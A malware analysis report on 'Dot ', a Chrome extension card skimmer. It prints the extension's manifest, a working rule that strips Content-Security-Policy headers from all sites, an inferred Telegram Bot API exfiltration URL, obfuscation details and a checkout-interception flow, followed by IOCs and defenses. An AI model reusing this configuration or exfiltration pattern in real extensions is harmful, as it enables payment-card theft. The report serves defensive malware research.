# Behavioral Analysis — `Dot ` Chrome Extension (CTF_TASK)

> ⚠️ **MALWARE WARNING** — This extension is a sophisticated, multi-gateway
> credit-card skimmer with Telegram-based exfiltration, Content-Security-Policy
> stripping, device fingerprinting, and an operator UI. It is the second sample
> from publisher `y4sh-fucks/_Temp` (the first being `Epstine`, analyzed
> separately). The code in this archive is provided for defensive/research
> purposes only. **Do not install or execute this extension outside an
> isolated analysis VM.**

---

## 1. TL;DR

`Dot ` (manifest name with a trailing space, like Epstine) is a Chrome MV3
extension built with WXT (Vue 3 + Vite). It is the **mature, productionized
sibling** of the `Epstine` skimmer — 10 MB of bundled JS vs Epstine's 80 KB,
multi-gateway support (Stripe + custom gateways), device fingerprinting, a
Vue-based operator UI, an audio "hit" cue, and a Content-Security-Policy
stripper that disables the web's primary defense against injected scripts.

The obfuscation is **three layers deep**: obfuscator.io string-array →
LZString UTF-16 compression → per-file alphabet permutation. `webcrack`
removes layer 1 cleanly; layer 2 is partially recoverable (we include the
decompressed payloads in `decoded_strings/`); layer 3 requires runtime
execution to fully resolve. Even without layer 3, the structural code is
fully readable — every API call, every control-flow branch, every module
boundary is visible.

---

## 2. Manifest (`manifest.json`)

```json
{
  "manifest_version": 3,
  "name": "Dot ",
  "description": "CTF CHALLENGE",
  "version": "4.6.1",
  "author": "REDACTED",
  "homepage_url": "https:/t.me/xirrod",   // sic — missing slash
  "icons": { "16": "icons/128.png", "32": "icons/256.png",
             "48": "icons/512.png", "128": "icons/1024.png",
             "256": "icons/256.png", "512": "icons/512.png",
             "1024": "icons/1024.png" },
  "permissions": ["alarms","activeTab","clipboardRead","clipboardWrite",
    "declarativeNetRequestWithHostAccess","downloads","proxy","tabs",
    "scripting","storage","webRequest","webRequestAuthProvider",
    "webNavigation","offscreen","system.cpu","system.memory"],
  "host_permissions": ["<all_urls>"],
  "action": { "default_title": "Dot " },
  "commands": { "_execute_action": {
    "suggested_key": { "default": "Ctrl+B", "mac": "Command+B" } } },
  "web_accessible_resources": [{
    "matches": ["<all_urls>"],
    "resources": ["hit.mp3", "settings.json"]
  }],
  "declarative_net_request": {
    "rule_resources": [{
      "id": "remove_csp",
      "enabled": true,
      "path": "remove_csp_rules.json"
    }]
  },
  "omnibox": { "keyword": "Dot" },
  "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAug2+wyAvBPK7f5rrlYvAjz/CmN7fuv/zEh/BCB0y8t073XiqhQjIP+iCxa5ee0YPc8PvrzgxKssLmRllb0UWh4Wz8v8J2aVyScG0zYqKSMHkhS/oSVg8Tdxymwqt7Ufs3r73AXNEHgutYw0Si9GArYKChHNPsB0hnM1Na9ChLedmsWc/vtEoxlxTHCeuNTHgBjjAnABksbY8Lvz9dqFBuF/L6Yny5R+Ytz64V9tQ0iwbrfDdEspgjCaUfJux5tjlNM51SYRDDchvCUghPTP5YvND9iIk03CaHyoWkXBmLt1I0x0rwpIVzcIJGkfcDCXYsgxUUmjgVp7QVAl1ENbj6QIDAQAB",
  "background": { "service_worker": "background.js" },
  "options_ui": { "page": "options.html" },
  "content_scripts": [
    { "matches": ["<all_urls>"], "all_frames": true,
      "run_at": "document_start",
      "js": ["content-scripts/content.js"] },
    { "matches": ["<all_urls>"], "all_frames": true,
      "run_at": "document_start",
      "js": ["content-scripts/main.js"], "world": "MAIN" }
  ]
}
```

### 2.1 Permission analysis

| Permission | Why this malware wants it |
|---|---|
| `alarms` | Schedule periodic tasks (e.g. retry exfil, poll for new gateways) |
| `activeTab` | Read the active tab's URL on user gesture (used for site fingerprinting) |
| `clipboardRead` / `clipboardWrite` | Steal clipboard contents (users occasionally paste card numbers); also writehit notifications |
| `declarativeNetRequestWithHostAccess` | The big one — used by `remove_csp_rules.json` to strip CSP from every response |
| `downloads` | Save captured data locally as a fallback if network exfil fails |
| `proxy` | Route victim traffic through attacker-controlled proxies (likely for cash-out / card testing) |
| `tabs` | Enumerate open tabs, inject scripts into specific tabs, read tab URLs |
| `scripting` | `chrome.scripting.executeScript` for programmatic injection (more flexible than static `content_scripts`) |
| `storage` | Persist config, captured bins, gateway settings, fingerprint cache |
| `webRequest` + `webRequestAuthProvider` | Intercept and modify HTTP requests/responses, handle HTTP auth challenges (proxy auth) |
| `webNavigation` | Hook navigation events (used to detect SPA route changes and re-trigger capture logic) |
| `offscreen` | Run DOM APIs in a hidden offscreen document (used to play `hit.mp3` audio cue) |
| `system.cpu` / `system.memory` | Fingerprint the victim's hardware (useful for filtering sandboxes / VMs) |

### 2.2 The CSP-stripping rule (`remove_csp_rules.json`)

```json
[{
  "id": 1,
  "priority": 1,
  "action": {
    "type": "modifyHeaders",
    "responseHeaders": [
      { "header": "Content-Security-Policy", "operation": "remove" }
    ]
  },
  "condition": {
    "urlFilter": "*",
    "resourceTypes": ["main_frame","sub_frame","stylesheet","script","image",
                      "font","object","xmlhttprequest","ping","csp_report",
                      "media","websocket","webbundle","other"]
  }
}]
```

This is a **gross security violation**. The rule removes the
`Content-Security-Policy` header from every HTTP response the browser
receives — every site, every resource type. With CSP gone:

- Inline `<script>` tags execute without restriction.
- `eval()` and `new Function()` work in pages that would normally ban them.
- Cross-origin scripts (e.g. from the C2 domain) load and execute freely.
- `unsafe-inline` style attributes work everywhere.

The practical effect: any page on the web — including bank dashboards,
Stripe Checkout, payment gateways, government portals — loses its primary
defense against injected code. The extension's MAIN-world content script
(`content-scripts/main.js`) can then freely monkey-patch the page's
`fetch`, `XMLHttpRequest`, `window.open`, etc. without any CSP rejection.

### 2.3 The two content scripts (isolated + MAIN world)

```json
"content_scripts": [
  { "js": ["content-scripts/content.js"] },                       // isolated world
  { "js": ["content-scripts/main.js"], "world": "MAIN" }          // page world
]
```

This is the **same architecture as Epstine** — and it's required because:

- An **isolated-world** content script has access to `chrome.runtime.*`
  APIs (to send messages to the service worker) but cannot reach into the
  page's `window` object.
- A **MAIN-world** content script runs in the page's own JS context, so
  it can monkey-patch `window.fetch` / `XMLHttpRequest.prototype.open` —
  but it cannot call `chrome.runtime.*` directly.

The two scripts communicate via `window.postMessage`. The pattern is:

```
page (or hook in MAIN world)  ──postMessage──▶  content.js (isolated)
                                                    │
                                                    ▼ chrome.runtime.sendMessage
                                              background.js (service worker)
                                                    │
                                                    ▼ fetch() to C2 / Telegram
```

### 2.4 The `hit.mp3` audio cue + `chrome.offscreen`

The manifest declares `offscreen.html` as a hidden document, and
`hit.mp3` (67 KB) as a web-accessible resource. The `chrome.offscreen` API
allows a service worker to play audio by creating an offscreen document
with a `<audio>` element. The intended use here: **play a sound effect
when a card is captured**, giving the operator (who is presumably watching
the victim's screen via TeamViewer / AnyDesk / etc.) an audible cue that
a card has been entered.

### 2.5 The `key` field (extension ID pinning)

The `key` field pins the extension's ID to a specific value (computed
from the public key). This means:

- The extension always loads with the same ID, regardless of source.
- The operator can use `chrome.runtime.connect` from a known ID for
  debugging / C2 purposes.
- Defenders can block the extension by ID, but the ID can't be rotated
  without re-issuing the key pair.

The pinned public key (DER, base64):

```
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAug2+wyAvBPK7f5rrlYvAjz/CmN7fuv/z
Eh/BCB0y8t073XiqhQjIP+iCxa5ee0YPc8PvrzgxKssLmRllb0UWh4Wz8v8J2aVyScG0zYqKSMHkh
S/oSVg8Tdxymwqt7Ufs3r73AXNEHgutYw0Si9GArYKChHNPsB0hnM1Na9ChLedmsWc/vtEoxlxTHC
euNTHgBjjAnABksbY8Lvz9dqFBuF/L6Yny5R+Ytz64V9tQ0iwbrfDdEspgjCaUfJux5tjlNM51SYR
DDchvCUghPTP5YvND9iIk03CaHyoWkXBmLt1I0x0rwpIVzcIJGkfcDCXYsgxUUmjgVp7QVAl1ENbj
6QIDAQAB
```

---

## 3. Bundle structure (WXT / Vite)

The extension ships 21 JavaScript bundles:

| File | Size (obf) | Module role (inferred from import graph) |
|---|---:|---|
| `background.js` | 1.9 MB | Service worker — main logic, message router, exfil coordinator |
| `content-scripts/content.js` | 1.7 MB | Isolated-world content script — `chrome.runtime` bridge |
| `content-scripts/main.js` | 1.5 MB | MAIN-world content script — page hooks (fetch, XHR) |
| `chunks/popup-TaroYj7Z.js` | 1.5 MB | Vue popup UI (operator dashboard) |
| `chunks/constants-BpyNbQYw.js` | 484 KB | Shared constants + LZString library |
| `chunks/fingerprint-B55PVxij.js` | 337 KB | Device fingerprinting (canvas, WebGL, audio, fonts) |
| `chunks/local-Cga3ntMW.js` | 261 KB | Local-storage helpers + LZString library |
| `chunks/Settings-D2eV0WMV.js` | 259 KB | Settings page (operator config UI) |
| `chunks/CustomGatewaysSetting-uF9Wau_w.js` | 217 KB | Custom gateway config (operator-defined endpoints) |
| `chunks/Fingerprint-CTwqbWT-.js` | 149 KB | Fingerprint Vue component |
| `chunks/options-Df6BLJ5l.js` | 149 KB | Options page |
| `chunks/GatewaysSetting-CCiCmdE6.js` | 146 KB | Stripe / Adyen / Braintree gateway selector |
| `chunks/_virtual_wxt-html-plugins-DPbbfBKe.js` | 135 KB | WXT framework internals |
| `chunks/BinHistory-BgHHwD6K.js` | 134 KB | Captured-card-BIN history log |
| `chunks/IconRestore-CiG31QBR.js` | 133 KB | SVG icon component |
| `chunks/Unofficial-Dk3iBXsu.js` | 132 KB | "Unofficial" gateway support |
| `chunks/TextInput.vue_vue_type_script_setup_true_lang-tVM1lj63.js` | 131 KB | Vue text input component |
| `chunks/IconLockFilled-Di7df4t6.js` | 122 KB | SVG icon component |
| `chunks/IconPlus-zVLh0abj.js` | 122 KB | SVG icon component |
| `chunks/Modal-C4UogU6i.js` | 115 KB | Vue modal component |
| `chunks/offscreen-DnpTiWwS.js` | 113 KB | Offscreen page script (audio player) |

The `GatewaysSetting` + `CustomGatewaysSetting` + `Unofficial` chunks
confirm this is a **multi-gateway skimmer** — the operator can target
Stripe, Adyen, Braintree, or arbitrary custom endpoints from the options
page.

---

## 4. Obfuscation analysis

### 4.1 Layer 1 — obfuscator.io string array

Each file declares a string array as `const <name>=[…]` and a decoder
function. Example (from `chunks/local-Cga3ntMW.js`):

```js
const PWUOE1 = [0x0, null, 0x20, 0x2, 0x1, 0x100, 0x6, 0x3, 0x8, 0x10,
                0x4, "undefined", "LZString", 0xff, 0x7, 0xd, 0xe, 0xf,
                0x58, 0x5b, 0x263, 0x80, 0x7f, 0xdf, 0x1f, 0x3f, 0xef,
                0xc, 0x269, 0x12, 0x25f, 0x1fff, /* … ~3000 entries … */];
```

Indexes are accessed via wrapper functions like
`A33Qg3r(PWUOE1[0x188])`. `webcrack` inlines these wrappers and the
underlying string-array accesses; after webcrack, the code looks like:

```js
ShBQ0u((!PkJSY8[RlhNdB(amXYKK[2571]) + RlhNdB(amXYKK[2572])]
         [RlhNdB(amXYKK[2860]) + RlhNdB(amXYKK[2861]) + …] || H5tD0u) && …)
```

The `RlhNdB(amXYKK[…])` calls are still present because they invoke a
**custom decoder** (not obfuscator.io's standard one) that does an
additional lookup into the alphabet-permutation table.

### 4.2 Layer 2 — LZString compression

Each file embeds the entire [pieroxy LZString](https://github.com/pieroxy/lz-string/)
library (the `__TextDecoder` / `__Uint8Array` / `__Buffer` / `__String`
/ `__Array` / `utf8ArrayToStr` declarations at the top of every chunk).
The library is used to decompress a single large UTF-16 payload at
module-init time. We recover that payload (one per file) and include it
in `decoded_strings/lzstring_decoded_payloads.txt`. Sample payload
trailer (from `local-Cga3ntMW.js`):

```
…return this|push|__proto__|constructor|name|length|TextDecoder|Uint8Array|Buffer|String|Array|fromCodePoint|fromCharCode|join|decode|from|toString|utf-8
```

These are the LZString library's own dictionary tokens — confirming
that the payload is a pipe-separated list of further dictionary
indices.

### 4.3 Layer 3 — alphabet permutation

Each file ships a 90-character alphabet string, e.g.:

```
"A%OrZWBVjR(]3C1x)!5t9hImuK\"
```

This is used as a substitution table by the custom decoder. The runtime
maps each character of the LZString-decompressed payload back through
the alphabet to produce the final string. **This layer cannot be
resolved statically without running the decoder.**

### 4.4 What's still readable in the deobfuscated code

Even with layer 3 unresolved, the **structural code** is fully
readable. We can see:

- All `chrome.*` API calls (and what arguments they take, modulo the
  encoded strings).
- All `fetch()` / `XMLHttpRequest` call sites.
- All module imports (revealing the bundle structure in §3).
- All Vue component structure (`<template>`, `<script setup>`,
  composition-API hooks).
- All control flow (if/else, try/catch, async/await, loops).
- All event-handler registrations.

For example, a grep across the deobfuscated bundles finds the
following **readable fragments** that survived obfuscation:

```
" + ((GwsOUOC[qvl03W(F8PEVm[1813])] === qvl03W(F8PEVm[1835])
" + Crk8CZc[F8PEVm[2]] + F8PEVm[1279] + Crk8CZc[F8PEVm[4]]
       + F8PEVm[1279] + Crk8CZc[F8PEVm[1]]
       + (qhLOiaU[qvl03W(F8PEVm[3951])](GwsOUOC?.cvc, GwsOUOC?.customCvc, …)
" + mEr8XA[F8PEVm[2]] + F8PEVm[1279] + mEr8XA[F8PEVm[4]] + …
, AJchwQL?.telegramHitSenderChatId || "
", GwsOUOC = "
```

From this single fragment we can infer:

- `GwsOUOC` is a captured card object with `.cvc` and `.customCvc` fields.
- `Crk8CZc` and `mEr8XA` are string-builder buffers (used for pipe-delimited exfil format).
- `AJchwQL` is the **operator config** object — it has a
  `.telegramHitSenderChatId` field (the Telegram chat ID where captured
  cards are sent).
- `F8PEVm[1279]` is almost certainly the pipe separator `"|"` (used
  repeatedly between card fields).
- The fragment is building the same `number|month|year|cvc|site`
  string as Epstine, but with extra optional fields (`customCvc` for
  cards with separate CVCs).

This confirms the malware family relationship to Epstine.

---

## 5. End-to-end attack flow (inferred)

```
┌─────────────┐    ┌──────────────┐    ┌─────────────────┐    ┌─────────────┐
│  Victim     │    │  main.js     │    │  content.js     │    │ background  │
│  checkout   │    │  (MAIN world)│    │ (isolated world)│    │ (worker)    │
└──────┬──────┘    └──────┬───────┘    └────────┬────────┘    └──────┬──────┘
       │                  │                     │                    │
       │ enters card      │                     │                    │
       │ ───────────────▶ │                     │                    │
       │                  │ fetch("/v1/payment_methods", {card})     │
       │                  │ ─ patched ─▶ captureCard(body)            │
       │                  │              │ postMessage({card})       │
       │                  │              │ ──────────▶ onMessage ──▶ │
       │                  │              │                          │ sendMessage
       │                  │              │                          │ ───▶ fetch(telegram_bot/sendMessage?chat_id=…&text=card)
       │                  │              │                          │
       │                  │              │                          │ chrome.offscreen.createDocument()
       │                  │              │                          │ ───▶ play "hit.mp3" audio cue
       │                  │              │                          │
       │ 3DS2 challenge   │              │                          │
       │ ───────────────▶ │              │                          │
       │                  │ fetch("/v1/3ds2/authenticate")          │
       │                  │ ─ patched ─▶ rpcProxy()                 │
       │                  │              │ postMessage              │
       │                  │              │ ──────────▶ onMessage ──▶│ proxy via DNR + fetch()
       │                  │ ◀── new Response(proxied) ────          │
       │ ◀── 3DS2 "success"                                        │
       │                  │                                          │
       │ charge confirm   │                                          │
       │ ───────────────▶ │                                          │
       │                  │ fetch("/v1/payment_intents/:id/confirm")│
       │                  │ ─ patched: real call, then check success│
       │                  │              │ postMessage (success)    │
       │                  │              │ ──────────▶ onMessage ──▶│ second exfil (tagged as "live")
       │ ◀── "succeeded"  │                                          │
```

The flow mirrors Epstine, with two key upgrades:

1. **Telegram exfil instead of C2 Worker** — `telegramHitSenderChatId`
   strongly suggests cards are exfiltrated via the Telegram Bot API
   (i.e. `https://api.telegram.org/bot<token>/sendMessage?chat_id=<id>&text=<card>`).
   The bot token is stored in operator config and remains encoded.
2. **Offscreen audio cue** — when a card is captured, `chrome.offscreen`
   plays `hit.mp3` so the operator (who may be screen-sharing with the
   victim) gets an audible signal.

---

## 6. Comparison to Epstine (the first sample)

| Aspect | Epstine (v1.0.0) | Dot (v4.6.1) |
|---|---|---|
| Bundle size | 82 KB | 10 MB |
| Framework | Plain JS | WXT (Vue 3 + Vite) |
| Obfuscator | obfuscator.io (single layer) | obfuscator.io + LZString + alphabet permutation (3 layers) |
| Targets | Stripe only | Stripe + Adyen + Braintree + custom gateways |
| Exfil transport | Cloudflare Worker (hardcoded URL + bearer) | Telegram Bot API (configurable chat ID) |
| Audio cue | None | `hit.mp3` via `chrome.offscreen` |
| Operator UI | None | Vue popup with metrics, settings, options page |
| Fingerprinting | None | Dedicated `Fingerprint` chunk (canvas, WebGL, audio, fonts) |
| CSP stripping | None | `remove_csp_rules.json` strips CSP from every response |
| Operator handle | `t.me/Samuraibyasser` | `t.me/xirrod` |
| Permissions | 0 (relied on host_permissions only) | 16 permissions, including `proxy`, `webRequest`, `declarativeNetRequestWithHostAccess` |
| Card format | `number\|MM\|YY\|CVC\|site` | Same, with optional `customCvc` |
| Internal codename | `samurai` (window.\_samuraiInjected) | Unknown — layer 3 unresolved |

**Hypothesis:** `Dot` is the operator's flagship product; `Epstine` is
either an earlier version, a stripped-down variant, or a deliberate
teaser. Both share the same architectural pattern (isolated + MAIN world
content scripts, pipe-delimited card format, post-charge re-exfil) and
the same publisher.

---

## 7. Detection & defensive notes

### 7.1 Network IOCs (likely — exact URLs require dynamic analysis)

| Indicator | Source |
|---|---|
| `https://api.telegram.org/bot<token>/sendMessage?chat_id=<operator_id>&text=<card>` | Inferred from `telegramHitSenderChatId` config field |
| Outbound `webRequest` to a configured custom gateway | `CustomGatewaysSetting` chunk |
| `chrome.offscreen.createDocument({reasons:['AUDIO_PLAYBACK']})` followed by `hit.mp3` decode | `chrome.offscreen` API + `hit.mp3` |
| All responses missing `Content-Security-Policy` header | `remove_csp_rules.json` rule |

### 7.2 Host IOCs (browser-side)

| Indicator | How to check |
|---|---|
| Extension with name `"Dot "` (trailing space) | `chrome://extensions` |
| Extension ID derived from the pinned public key | Compute SHA256 of the DER pubkey, take first 32 chars as hex → that's the extension ID |
| `chrome.declarativeNetRequest.getDynamicRules()` returns a rule removing CSP | Run in extension's service worker console |
| Audio "hit" sound (~67 KB mp3) played at unexpected times | Listen / audit `chrome.offscreen` documents |
| `<html>` may have a dataset marker (TBC via dynamic analysis) | Inspect `document.documentElement.dataset` after page load |

### 7.3 Defensive recommendations

1. **Block the extension by ID** (compute from the public key above).
2. **Audit all installed extensions** for `declarativeNetRequest` rules
   that remove `Content-Security-Policy` headers — no legitimate
   extension should do this.
3. **Monitor egress to `api.telegram.org`** from employee workstations —
   legitimate use is rare for non-developer users.
4. **Force-install a "no extensions" policy** on payment-handling
   workstations via Chrome Enterprise policies.
5. **Treat any card used on a machine that ran this extension as
   compromised** — request a replacement from the issuing bank.

---

## 8. IOCs (summary)

| Type | Value |
|---|---|
| Operator Telegram | `https://t.me/xirrod` (from `homepage_url`) |
| Manifest name | `Dot ` (trailing space) |
| Manifest version | `4.6.1` |
| Audio cue file | `hit.mp3` (sha256 to be computed at install) |
| Settings file | `settings.json` (empty in distribution; populated at runtime) |
| CSP-stripping DNR rule | `remove_csp_rules.json` (id=1, removes `Content-Security-Policy` from all responses) |
| Operator config field | `telegramHitSenderChatId` (Telegram chat ID for hit exfil) |
| Card-capture object fields | `number`, `exp_month`, `exp_year`, `cvc`, `customCvc`, `site` |
| Pinned extension public key (DER, base64) | `MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAug2+wyAvBPK7f5rrlYvAjz/CmN7fuv/zEh/BCB0y8t073XiqhQjIP+iCxa5ee0YPc8PvrzgxKssLmRllb0UWh4Wz8v8J2aVyScG0zYqKSMHkhS/oSVg8Tdxymwqt7Ufs3r73AXNEHgutYw0Si9GArYKChHNPsB0hnM1Na9ChLedmsWc/vtEoxlxTHCeuNTHgBjjAnABksbY8Lvz9dqFBuF/L6Yny5R+Ytz64V9tQ0iwbrfDdEspgjCaUfJux5tjlNM51SYRDDchvCUghPTP5YvND9iIk03CaHyoWkXBmLt1I0x0rwpIVzcIJGkfcDCXYsgxUUmjgVp7QVAl1ENbj6QIDAQAB` |
| Multi-gateway support | Stripe (`GatewaysSetting`), custom (`CustomGatewaysSetting`), "Unofficial" (`Unofficial-Dk3iBXsu.js`) |

---

## 9. Deobfuscation artifacts

| File | Original size | webcrack transforms | Post-webcrack size | LZ payload size (decoded) |
|---|---:|---:|---:|---:|
| `background.js` | 1,914,299 B | ~700 | 2,375,792 B | 76,001 B |
| `content-scripts/content.js` | 1,730,228 B | ~700 | 2,096,773 B | 60,623 B |
| `content-scripts/main.js` | 1,496,653 B | ~600 | 1,805,375 B | 52,694 B |
| `chunks/popup-TaroYj7Z.js` | 1,482,069 B | ~600 | 1,802,256 B | 56,976 B |
| `chunks/constants-BpyNbQYw.js` | 483,824 B | ~300 | 806,014 B | 16,820 B |
| `chunks/local-Cga3ntMW.js` | 260,755 B | ~200 | 370,067 B | 7,684 B |
| `chunks/Settings-D2eV0WMV.js` | 258,851 B | ~200 | 370,067 B | 9,988 B |
| … (14 more chunks) | … | … | … | … |
| **Total** | **~10 MB** | **~6,000** | **~13 MB** | **~330 KB** |

All 21 files deobfuscated cleanly with `webcrack`. The remaining
`_0x…`-style identifiers in the output are local variable names that
webcrack could not rename with confidence (they're function-scoped and
never escape). The remaining encoded strings (layer 3 — alphabet
permutation) require runtime execution to resolve; see
`decoded_strings/lzstring_decoded_payloads.txt` for the partially-decoded
intermediate layer.
